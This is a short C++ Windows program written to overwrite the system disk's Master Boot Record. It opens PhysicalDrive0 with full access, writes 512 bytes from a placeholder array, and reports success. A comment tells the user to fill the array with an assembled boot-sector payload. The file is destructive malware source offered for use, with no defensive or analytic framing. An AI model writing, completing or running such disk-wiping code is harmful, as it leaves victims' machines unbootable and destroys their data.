#include <Windows.h>
#include <iostream>
#define NTDDI_WIN7 (0x0601000)

const unsigned char MasterBootRecord[] = {}; //You need to convert .asm file to .bin and then you convert your .bin file to hexadecimal code and you paste it inside of {}

using namespace std;

int CALLBACK WinMain(
	HINSTANCE hInstance, HINSTANCE hPrevInstance,
	LPSTR lpCmdLine, int nCmdShow
)
{
	DWORD dwBytesWritten;
	HANDLE MBR = CreateFileW(
		L"\\\\.\\PhysicalDrive0", GENERIC_ALL,
		FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
		OPEN_EXISTING, NULL, NULL);
	if (WriteFile(MBR, MasterBootRecord, 512, &dwBytesWritten, 0) == TRUE)
	{
		cout << "Master Boot Record has been over written" << endl;
		Sleep(5000);
		ExitProcess(0);
	}
	else
	{
		cout << "FAILED!";
		Sleep(5000);
		ExitProcess(0);
	}
	CloseHandle(MBR);
	return EXIT_SUCCESS;
}